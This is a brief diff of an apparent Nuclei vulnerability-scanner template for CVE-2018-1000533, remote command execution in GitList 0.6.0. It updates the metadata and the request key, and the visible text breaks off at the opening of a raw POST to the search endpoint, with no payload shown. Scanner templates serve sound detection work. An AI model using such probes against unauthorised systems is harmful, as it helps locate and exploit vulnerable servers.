@@ -1,4 +1,5 @@
-id: gitlist 0.6.0 RCE（CVE-2018-1000533）
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: gitlist-0-6-0-RCE-CVE-2018-1000533
 info:
   name: gitlist-cve-2018-1000533 Remote Command Execution Vulnerability
   author: nithissh
@@ -7,7 +8,7 @@ info:
   reference: unknown
   tags: gitlist, rce, oob
 
-requests:
+http:
   - raw:
       - |
         POST /{{project}}/tree/a/search HTTP/1.1
